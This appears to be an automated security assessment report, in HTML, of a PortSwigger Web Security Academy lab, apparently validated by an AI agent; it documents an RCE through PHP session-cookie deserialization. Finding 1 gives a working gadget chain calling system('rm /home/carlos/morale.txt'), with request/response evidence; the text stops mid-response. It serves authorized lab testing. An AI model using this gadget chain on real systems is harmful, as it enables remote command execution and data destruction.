@@ -1,0 +1,1519 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>VERDICT Report a-mr61ymp9-ze50u4</title><style>
+*{box-sizing:border-box}
+body{font:14px/1.5 -apple-system,Segoe UI,Roboto,Helvetica,Arial,sans-serif;color:#1a1a1a;margin:0;padding:32px;background:#fff}
+h1{font-size:22px;margin:0 0 4px} h2{font-size:17px;margin:28px 0 10px;border-bottom:2px solid #eee;padding-bottom:4px}
+h3{font-size:15px;margin:18px 0 6px}
+code,pre{font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace}
+pre{background:#f6f8fa;border:1px solid #e3e6ea;border-radius:6px;padding:10px;overflow:auto;font-size:12.5px;white-space:pre-wrap;word-break:break-word}
+.meta{color:#555;font-size:13px;margin:0 0 2px}
+.badge{display:inline-block;color:#fff;border-radius:4px;padding:1px 8px;font-size:12px;font-weight:700;letter-spacing:.3px}
+.sumtags span{display:inline-block;margin:0 6px 6px 0;padding:2px 10px;border-radius:12px;background:#eef1f4;font-size:12px}
+.f{border:1px solid #e3e6ea;border-radius:8px;padding:14px 16px;margin:0 0 14px}
+.f .kv{color:#555;font-size:12.5px;margin:2px 0}
+.f .desc{margin:8px 0}
+table{border-collapse:collapse;width:100%;font-size:13px}
+th,td{border:1px solid #e3e6ea;padding:6px 8px;text-align:left;vertical-align:top}
+th{background:#f6f8fa}
+table.info td:first-child{width:170px;color:#555;font-weight:600;background:#fafbfc}
+.muted{color:#888}
+img.shot{max-width:220px;max-height:140px;border:1px solid #ddd;border-radius:4px}
+.ev{margin:10px 0 0;border-left:3px solid #cdd5dd;padding-left:10px}
+.ev .evh{font-size:12px;color:#555;margin:0 0 4px}
+.ev .lbl{font-size:11px;font-weight:700;letter-spacing:.4px;color:#5f7d8c;margin:6px 0 2px}
+.ev pre{margin:0;max-height:420px}
+html{scroll-behavior:smooth}
+.toc{background:#fafbfc;border:1px solid #e3e6ea;border-radius:8px;padding:10px 16px;margin:14px 0 8px}
+.toc .toctitle{font-weight:700;font-size:12px;color:#555;letter-spacing:.4px;text-transform:uppercase;margin:0 0 6px}
+.toc ul{margin:0;padding-left:18px} .toc>ul{padding-left:16px;list-style:none}
+.toc li{margin:2px 0;font-size:13px} .toc a{color:#0366d6;text-decoration:none} .toc a:hover{text-decoration:underline}
+.toc .sev{font-weight:700;font-size:11px;letter-spacing:.3px}
+@media print{body{padding:0}.f{break-inside:avoid}.ev pre{max-height:none}.toc{break-inside:avoid}}
+</style></head>
+<body>
+<h1>VERDICT Security Assessment Report</h1>
+<nav class="toc"><div class="toctitle">Contents</div><ul>
+<li><a href="#assessment-information">Assessment Information</a></li>
+<li><a href="#scope">Scope</a></li>
+<li><a href="#summary">Summary</a></li>
+<li><a href="#findings">Findings</a><ul>
+<li><a href="#finding-1">1. <span class="sev" style="color:#b00020">CRITICAL</span> [rce] RCE via insecure PHP deserialization of session cookie — custom gadget chain deletes /home/carlos/morale.txt</a></li>
+<li><a href="#finding-2">2. <span class="sev" style="color:#d32f2f">HIGH</span> [session] Insecure deserialization of session cookie — unsigned, forgeable PHP object identity</a></li>
+<li><a href="#finding-3">3. <span class="sev" style="color:#f57c00">MEDIUM</span> [info-disclosure] PHP source code disclosure via editor backup (~) at /cgi-bin/libs/CustomTemplate.php~</a></li>
+<li><a href="#finding-4">4. <span class="sev" style="color:#c9a227">LOW</span> [rate-limit] No brute-force protection / rate limiting on login</a></li>
+<li><a href="#finding-5">5. <span class="sev" style="color:#c9a227">LOW</span> [burp] Strict transport security not enforced (2 URLs)</a></li>
+<li><a href="#finding-6">6. <span class="sev" style="color:#5f7d8c">INFO</span> [burp] TLS certificate</a></li>
+</ul></li>
+<li><a href="#suspected">Suspected (needs manual verification)</a><ul>
+<li><a href="#finding-7">7. <span class="sev" style="color:#b00020">CRITICAL</span> [rce] PHP object injection via session cookie — likely escalates to remote code execution</a></li>
+</ul></li>
+</ul></nav>
+<h2 id="assessment-information">Assessment Information</h2><table class="info">
+<tr><td>Assessment ID</td><td><code>a-mr61ymp9-ze50u4</code></td></tr>
+<tr><td>Target</td><td><code>https://0a14001003ba06e480069a13001b0048.web-security-academy.net/</code></td></tr>
+<tr><td>Started</td><td>2026-07-04T07:40:25.888Z</td></tr>
+<tr><td>Generated</td><td>2026-07-06T05:43:20.722Z</td></tr>
+<tr><td>Phase</td><td>report</td></tr>
+<tr><td>Screens</td><td>4 mapped · 4 scanned · 0 remaining</td></tr>
+<tr><td>Hypotheses</td><td>0 (0 confirmed)</td></tr>
+<tr><td>Findings</td><td>6</td></tr>
+<tr><td>Tooling</td><td>VERDICT</td></tr>
+</table>
+<h2 id="scope">Scope</h2><table class="info">
+<tr><td>In-scope hosts</td><td><code>*.web-security-academy.net</code></td></tr>
+<tr><td>Out-of-scope hosts</td><td>&mdash;</td></tr>
+<tr><td>In-scope paths</td><td><code>/</code></td></tr>
+<tr><td>Out-of-scope paths</td><td>&mdash;</td></tr>
+<tr><td>Rate</td><td>30 req/min, max 2 concurrent</td></tr>
+</table>
+<h2 id="summary">Summary</h2>
+<p>6 finding(s)</p><p class="sumtags"><span><b style="color:#b00020">1</b> critical</span><span><b style="color:#d32f2f">1</b> high</span><span><b style="color:#f57c00">1</b> medium</span><span><b style="color:#c9a227">2</b> low</span><span><b style="color:#5f7d8c">1</b> info</span></p>
+<p class="muted">Plus <b>1</b> suspected lead(s) needing manual verification (listed separately, not counted above).</p>
+<h2 id="findings">Findings</h2>
+<div class="f" id="finding-1">
+<h3><span class="badge" style="background:#b00020">CRITICAL</span> 1. [rce] RCE via insecure PHP deserialization of session cookie — custom gadget chain deletes /home/carlos/morale.txt</h3>
+<div class="kv">Screen: <code>(cross-screen)</code></div>
+<div class="kv">Source: validator <code>claude-pilot</code></div>
+<div class="kv">Scope basis: authorized target https://0a14001003ba06e480069a13001b0048.web-security-academy.net/</div>
+<div class="desc">The session cookie is an UNSIGNED base64-encoded PHP-serialized object (default: O:4:&quot;User&quot;:2:{username, access_token}). It has no HMAC/signature, so an attacker can replace it with an arbitrary serialized object which the server feeds to unserialize() on every request (any endpoint; /my-account used here). Using the class source disclosed at /cgi-bin/libs/CustomTemplate.php~, a custom gadget chain achieves arbitrary OS command execution: CustomTemplate::__wakeup() -&gt; build_product() -&gt; new Product(default_desc_type, desc); Product::__construct() evaluates desc-&gt;{default_desc_type}; with desc = a DefaultMap, that dynamic property read fires DefaultMap::__get() -&gt; call_user_func(callback, name). Setting callback=system and default_desc_type=&quot;rm /home/carlos/morale.txt&quot; executes system(&quot;rm /home/carlos/morale.txt&quot;). Delivering the gadget in the session cookie deleted the target file, which flipped the lab to solved. This is arbitrary command execution as the web app user (full server compromise class).</div>
+<div><b>Reproduction</b></div><pre>1) GET /cgi-bin/libs/CustomTemplate.php~ to obtain class source. 2) Build gadget: O:14:&quot;CustomTemplate&quot;:2:{ [private default_desc_type]=&quot;rm /home/carlos/morale.txt&quot;; [private desc]=O:10:&quot;DefaultMap&quot;:1:{ [private callback]=&quot;system&quot; } } using null-byte private-property mangling. 3) base64-encode and set as the session cookie, then GET /my-account -&gt; unserialize fires __wakeup -&gt; Product -&gt; DefaultMap::__get -&gt; call_user_func(&quot;system&quot;,&quot;rm /home/carlos/morale.txt&quot;). CONFIRMED via probe_scenario (WORKFLOW MANIPULATION ACCEPTED): benign wiener session BEFORE exploit -&gt; home page lab NOT solved (marker absent, ev-mr658712-2g); after gadget delivery, two stable steady-state home-page reads return HTTP 200 identical 14438-byte bodies containing 'academyLabBanner is-solved' (ev-mr65g3sx-2l, ev-mr65g821-2m) = morale.txt deleted.</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr658712-2g</code> — <code>artifacts/_/ev-mr658712-2g/</code></div><div class="lbl">REQUEST</div><pre>GET / HTTP/1.1
+Host: 0a14001003ba06e480069a13001b0048.web-security-academy.net
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+Cookie: &lt;redacted&gt;</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+content-length: 11627
+content-type: text/html; charset=utf-8
+x-frame-options: SAMEORIGIN
+
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;!--LAB_HEAD_START--&gt;
+    &lt;head&gt;
+        &lt;link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet&gt;
+        &lt;link href=/resources/css/labsEcommerce.css rel=stylesheet&gt;
+        &lt;title&gt;Mystery challenge&lt;/title&gt;
+    &lt;/head&gt;
+&lt;!--LAB_HEAD_END--&gt;
+    &lt;body&gt;
+        &lt;script src=&quot;/resources/labheader/js/labHeader.js&quot;&gt;&lt;/script&gt;
+        &lt;!--LAB_HEADER_START--&gt;
+        &lt;div id=&quot;academyLabHeader&quot;&gt;
+            &lt;section class='academyLabBanner'&gt;
+                &lt;div class=container&gt;
+                    &lt;div class=logo&gt;&lt;/div&gt;
+                        &lt;div class=title-container&gt;
+                            &lt;h2&gt;Mystery challenge&lt;/h2&gt;
+                            &lt;button id='submitSolution' class='button' method='POST' path='/submitSolution' parameter='answer' data-answer-prompt='Solution (may not be required, depending on lab - reveal objective for more information)'&gt;Submit solution&lt;/button&gt;
+                            &lt;script src='/resources/labheader/js/submitSolution.js'&gt;&lt;/script&gt;
+                            &lt;a class=link-back href='https://portswigger.net/web-security/dashboard'&gt;
+                                Back&amp;nbsp;to&amp;nbsp;lab&amp;nbsp;dashboard&amp;nbsp;
+                                &lt;svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow&gt;
+                                    &lt;g&gt;
+                                        &lt;polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'&gt;&lt;/polygon&gt;
+                                        &lt;polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'&gt;&lt;/polygon&gt;
+                                    &lt;/g&gt;
+                                &lt;/svg&gt;
+                            &lt;/a&gt;
+                            &lt;br/&gt;&lt;div id=mysteryObjective&gt;&lt;a id=mysteryReveal data-hidden-objective='RGVsZXRlIHRoZSBmaWxlIDxjb2RlPi9ob21lL2Nhcmxvcy9tb3JhbGUudHh0PC9jb2RlPi4=' data-hidden-link='aHR0cHM6Ly9wb3J0c3dpZ2dlci5uZXQvd2ViLXNlY3VyaXR5L2Rlc2VyaWFsaXphdGlvbi9leHBsb2l0aW5nL2xhYi1kZXNlcmlhbGl6YXRpb24tZGV2ZWxvcGluZy1hLWN1c3RvbS1nYWRnZXQtY2hhaW4tZm9yLXBocC1kZXNlcmlhbGl6YXRpb24='&gt;
+                                Reveal&amp;nbsp;objective&amp;nbsp;
+                            &lt;/a&gt;&lt;/div&gt;
+                            &lt;script src='/resources/labheader/js/mysteryObjective.js'&gt;&lt;/script&gt;
+                        &lt;/div&gt;
+                        &lt;div class='widgetcontainer-lab-status is-notsolved'&gt;
+                            &lt;span&gt;LAB&lt;/span&gt;
+                            &lt;p&gt;Not solved&lt;/p&gt;
+                            &lt;span class=lab-status-icon&gt;&lt;/span&gt;
+                        &lt;/div&gt;
+                    &lt;/div&gt;
+                &lt;/div&gt;
+            &lt;/section&gt;
+        &lt;/div&gt;
+        &lt;!--LAB_HEADER_END--&gt;
+        &lt;div theme=&quot;ecommerce&quot;&gt;
+            &lt;section class=&quot;maincontainer&quot;&gt;
+                &lt;div class=&quot;container&quot;&gt;
+                    &lt;header class=&quot;navigation-header&quot;&gt;
+                        &lt;section class=&quot;top-links&quot;&gt;
+                            &lt;a href=/&gt;Home&lt;/a&gt;&lt;p&gt;|&lt;/p&gt;
+                            &lt;a href=&quot;/my-account?id=wiener&quot;&gt;My account&lt;/a&gt;&lt;p&gt;|&lt;/p&gt;
+                        &lt;/section&gt;
+                    &lt;/header&gt;
+                    &lt;header class=&quot;notification-header&quot;&gt;
+                    &lt;/header&gt;
+                    &lt;section class=&quot;ecoms-pageheader&quot;&gt;
+                        &lt;img src=&quot;/resources/images/shop.svg&quot;&gt;
+                    &lt;/section&gt;
+                    &lt;section class=&quot;container-list-tiles&quot;&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/8.jpg&quot;&gt;
+                            &lt;h3&gt;Folding Gadgets&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating2.png&quot;&gt;
+                            $21.07
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=1&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/29.jpg&quot;&gt;
+                            &lt;h3&gt;Waterproof Tea Bags&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating1.png&quot;&gt;
+                            $9.00
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=2&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/30.jpg&quot;&gt;
+                            &lt;h3&gt;Giant Pillow Thing&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating4.png&quot;&gt;
+                            $74.00
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=3&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/61.jpg&quot;&gt;
+                            &lt;h3&gt;Safety First&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating1.png&quot;&gt;
+                            $85.24
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=4&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/73.jpg&quot;&gt;
+                            &lt;h3&gt;Beat the Vacation Traffic&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating3.png&quot;&gt;
+                            $34.40
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=5&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/58.jpg&quot;&gt;
+                            &lt;h3&gt;There is No &amp;apos;I&amp;apos; in Team&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating5.png&quot;&gt;
+                            $94.92
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=6&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/20.jpg&quot;&gt;
+                            &lt;h3&gt;Single Use Food Hider&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating1.png&quot;&gt;
+                            $70.58
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=7&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/38.jpg&quot;&gt;
+                            &lt;h3&gt;Six Pack Beer Belt&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating3.png&quot;&gt;
+                            $22.00
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=8&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/4.jpg&quot;&gt;
+                            &lt;h3&gt;BURP Protection&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating5.png&quot;&gt;
+                            $40.74
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=9&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/16.jpg&quot;&gt;
+                            &lt;h3&gt;Photobomb Backdrops&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating4.png&quot;&gt;
+                            $4.63
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=10&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/6.jpg&quot;&gt;
+                            &lt;h3&gt;Com-Tool&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating1.png&quot;&gt;
+                            $26.45
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=11&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/23.jpg&quot;&gt;
+                            &lt;h3&gt;Sprout More Brain Power&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating1.png&quot;&gt;
+                            $44.57
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=12&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/45.jpg&quot;&gt;
+                            &lt;h3&gt;ZZZZZZ Bed - Your New Home Office&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating2.png&quot;&gt;
+                            $26.76
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=13&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/65.jpg&quot;&gt;
+                            &lt;h3&gt;Eco Boat&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating5.png&quot;&gt;
+                            $20.53
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=14&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/54.jpg&quot;&gt;
+                            &lt;h3&gt;Robot Home Security Buddy&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating1.png&quot;&gt;
+                            $71.28
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=15&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/36.jpg&quot;&gt;
+                            &lt;h3&gt;Caution Sign&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating2.png&quot;&gt;
+                            $44.69
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=16&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/48.jpg&quot;&gt;
+                            &lt;h3&gt;BBQ Suitcase&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating3.png&quot;&gt;
+                            $56.53
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=17&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/5.jpg&quot;&gt;
+                            &lt;h3&gt;Cheshire Cat Grin&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating2.png&quot;&gt;
+                            $39.50
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=18&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/46.jpg&quot;&gt;
+                            &lt;h3&gt;Hitch A Lift&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating3.png&quot;&gt;
+                            $46.08
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=19&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/51.jpg&quot;&gt;
+                            &lt;h3&gt;Real Life Photoshopping&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating3.png&quot;&gt;
+                            $11.90
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=20&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                    &lt;/section&gt;
+                    &lt;!-- TODO: Refactor once /cgi-bin/libs/CustomTemplate.php is updated --&gt;
+                &lt;/div&gt;
+            &lt;/section&gt;
+            &lt;div class=&quot;footer-wrapper&quot;&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/body&gt;
+&lt;/html&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr65g3sx-2l</code> — <code>artifacts/_/ev-mr65g3sx-2l/</code></div><div class="lbl">REQUEST</div><pre>GET / HTTP/1.1
+Host: 0a14001003ba06e480069a13001b0048.web-security-academy.net
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+content-length: 14438
+content-type: text/html; charset=utf-8
+set-cookie: &lt;redacted&gt;
+x-frame-options: SAMEORIGIN
+
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;!--LAB_HEAD_START--&gt;
+    &lt;head&gt;
+        &lt;link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet&gt;
+        &lt;link href=/resources/css/labsEcommerce.css rel=stylesheet&gt;
+        &lt;title&gt;Mystery challenge&lt;/title&gt;
+    &lt;/head&gt;
+&lt;!--LAB_HEAD_END--&gt;
+    &lt;body&gt;
+        &lt;script src=&quot;/resources/labheader/js/labHeader.js&quot;&gt;&lt;/script&gt;
+        &lt;!--LAB_HEADER_START--&gt;
+        &lt;div id=&quot;academyLabHeader&quot;&gt;
+            &lt;section class='academyLabBanner is-solved'&gt;
+                &lt;div class=container&gt;
+                    &lt;div class=logo&gt;&lt;/div&gt;
+                        &lt;div class=title-container&gt;
+                            &lt;h2&gt;Mystery challenge&lt;/h2&gt;
+                            &lt;a class=link-back href='https://portswigger.net/web-security/dashboard'&gt;
+                                Back&amp;nbsp;to&amp;nbsp;lab&amp;nbsp;dashboard&amp;nbsp;
+                                &lt;svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow&gt;
+                                    &lt;g&gt;
+                                        &lt;polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'&gt;&lt;/polygon&gt;
+                                        &lt;polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'&gt;&lt;/polygon&gt;
+                                    &lt;/g&gt;
+                                &lt;/svg&gt;
+                            &lt;/a&gt;
+                            &lt;br/&gt;&lt;div id=mysteryObjective&gt;&lt;a id=mysteryReveal data-hidden-objective='RGVsZXRlIHRoZSBmaWxlIDxjb2RlPi9ob21lL2Nhcmxvcy9tb3JhbGUudHh0PC9jb2RlPi4=' data-hidden-link='aHR0cHM6Ly9wb3J0c3dpZ2dlci5uZXQvd2ViLXNlY3VyaXR5L2Rlc2VyaWFsaXphdGlvbi9leHBsb2l0aW5nL2xhYi1kZXNlcmlhbGl6YXRpb24tZGV2ZWxvcGluZy1hLWN1c3RvbS1nYWRnZXQtY2hhaW4tZm9yLXBocC1kZXNlcmlhbGl6YXRpb24='&gt;
+                                Reveal&amp;nbsp;objective&amp;nbsp;
+                            &lt;/a&gt;&lt;/div&gt;
+                            &lt;script src='/resources/labheader/js/mysteryObjective.js'&gt;&lt;/script&gt;
+                        &lt;/div&gt;
+                        &lt;div class='widgetcontainer-lab-status is-solved'&gt;
+                            &lt;span&gt;LAB&lt;/span&gt;
+                            &lt;p&gt;Solved&lt;/p&gt;
+                            &lt;span class=lab-status-icon&gt;&lt;/span&gt;
+                        &lt;/div&gt;
+                    &lt;/div&gt;
+                &lt;/div&gt;
+            &lt;/section&gt;
+            &lt;section id=notification-labsolved class=notification-labsolved&gt;
+                &lt;div class=container&gt;
+                    &lt;h4&gt;Congratulations, you solved the lab!&lt;/h4&gt;
+                    &lt;div&gt;
+                        &lt;span&gt;
+                            Share your skills!
+                        &lt;/span&gt;
+                        &lt;a class=button href='https://twitter.com/intent/tweet?text=I+completed+the+Web+Security+Academy+lab%3a%0aMystery+challenge%0a%0a@WebSecAcademy%0a&amp;url=https%3a%2f%2fportswigger.net%2fweb-security%2fdeserialization%2fexploiting%2flab-deserialization-developing-a-custom-gadget-chain-for-php-deserialization&amp;related=WebSecAcademy,Burp_Suite'&gt;
+                    &lt;svg xmlns='http://www.w3.org/2000/svg' width=24 height=24 viewBox='0 0 20.44 17.72'&gt;
+                        &lt;title&gt;twitter-button&lt;/title&gt;
+                        &lt;path d='M0,15.85c11.51,5.52,18.51-2,18.71-12.24.3-.24,1.73-1.24,1.73-1.24H18.68l1.43-2-2.74,1a4.09,4.09,0,0,0-5-.84c-3.13,1.44-2.13,4.94-2.13,4.94S6.38,6.21,1.76,1c-1.39,1.56,0,5.39.67,5.73C2.18,7,.66,6.4.66,5.9-.07,9.36,3.14,10.54,4,10.72a2.39,2.39,0,0,1-2.18.08c-.09,1.1,2.94,3.33,4.11,3.27A10.18,10.18,0,0,1,0,15.85Z'&gt;&lt;/path&gt;
+                    &lt;/svg&gt;
+                        &lt;/a&gt;
+                        &lt;a class=button href='https://www.linkedin.com/sharing/share-offsite?url=https%3a%2f%2fportswigger.net%2fweb-security%2fdeserialization%2fexploiting%2flab-deserialization-developing-a-custom-gadget-chain-for-php-deserialization'&gt;
+                    &lt;svg viewBox='0 0 64 64' width='24' xml:space='preserve' xmlns='http://www.w3.org/2000/svg'
+                        &lt;title&gt;linkedin-button&lt;/title&gt;
+                        &lt;path d='M2,6v52c0,2.2,1.8,4,4,4h52c2.2,0,4-1.8,4-4V6c0-2.2-1.8-4-4-4H6C3.8,2,2,3.8,2,6z M19.1,52H12V24.4h7.1V52z    M15.6,18.9c-2,0-3.6-1.5-3.6-3.4c0-1.9,1.6-3.4,3.6-3.4c2,0,3.6,1.5,3.6,3.4C19.1,17.4,17.5,18.9,15.6,18.9z M52,52h-7.1V38.2   c0-2.9-0.1-4.8-0.4-5.7c-0.3-0.9-0.8-1.5-1.4-2c-0.7-0.5-1.5-0.7-2.4-0.7c-1.2,0-2.3,0.3-3.2,1c-1,0.7-1.6,1.6-2,2.7   c-0.4,1.1-0.5,3.2-0.5,6.2V52h-8.6V24.4h7.1v4.1c2.4-3.1,5.5-4.7,9.2-4.7c1.6,0,3.1,0.3,4.5,0.9c1.3,0.6,2.4,1.3,3.1,2.2   c0.7,0.9,1.2,1.9,1.4,3.1c0.3,1.1,0.4,2.8,0.4,4.9V52z'/&gt;
+                    &lt;/svg&gt;
+                        &lt;/a&gt;
+                        &lt;a href='https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-developing-a-custom-gadget-chain-for-php-deserialization'&gt;
+                            Continue learning 
+                            &lt;svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow&gt;
+                                &lt;g&gt;
+                                    &lt;polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'&gt;&lt;/polygon&gt;
+                                    &lt;polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'&gt;&lt;/polygon&gt;
+                                &lt;/g&gt;
+                            &lt;/svg&gt;
+                        &lt;/a&gt;
+                    &lt;/div&gt;
+                &lt;/div&gt;
+            &lt;/section&gt;
+        &lt;/div&gt;
+        &lt;!--LAB_HEADER_END--&gt;
+        &lt;div theme=&quot;ecommerce&quot;&gt;
+            &lt;section class=&quot;maincontainer&quot;&gt;
+                &lt;div class=&quot;container&quot;&gt;
+                    &lt;header class=&quot;navigation-header&quot;&gt;
+                        &lt;section class=&quot;top-links&quot;&gt;
+                            &lt;a href=/&gt;Home&lt;/a&gt;&lt;p&gt;|&lt;/p&gt;
+                            &lt;a href=&quot;/my-account&quot;&gt;My account&lt;/a&gt;&lt;p&gt;|&lt;/p&gt;
+                        &lt;/section&gt;
+                    &lt;/header&gt;
+                    &lt;header class=&quot;notification-header&quot;&gt;
+                    &lt;/header&gt;
+                    &lt;section class=&quot;ecoms-pageheader&quot;&gt;
+                        &lt;img src=&quot;/resources/images/shop.svg&quot;&gt;
+                    &lt;/section&gt;
+                    &lt;section class=&quot;container-list-tiles&quot;&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/8.jpg&quot;&gt;
+                            &lt;h3&gt;Folding Gadgets&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating2.png&quot;&gt;
+                            $21.07
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=1&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/29.jpg&quot;&gt;
+                            &lt;h3&gt;Waterproof Tea Bags&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating1.png&quot;&gt;
+                            $9.00
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=2&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/30.jpg&quot;&gt;
+                            &lt;h3&gt;Giant Pillow Thing&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating4.png&quot;&gt;
+                            $74.00
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=3&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/61.jpg&quot;&gt;
+                            &lt;h3&gt;Safety First&lt;/h3&gt;
